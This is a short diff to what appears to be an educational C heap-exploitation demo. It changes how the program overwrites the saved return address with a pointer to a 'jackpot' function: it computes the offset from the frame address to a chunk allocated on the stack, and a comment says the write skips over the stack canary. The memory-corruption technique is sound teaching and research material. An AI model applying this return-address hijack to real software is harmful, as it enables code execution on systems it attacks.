@@ -108,7 +108,8 @@ int main(int argc, char * argv[]){
 
   fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
-  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+  long offset = (long)__builtin_frame_address(0) - (long)p4;
+  memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 
   // sanity check
   assert((long)__builtin_return_address(0) == (long)jackpot);
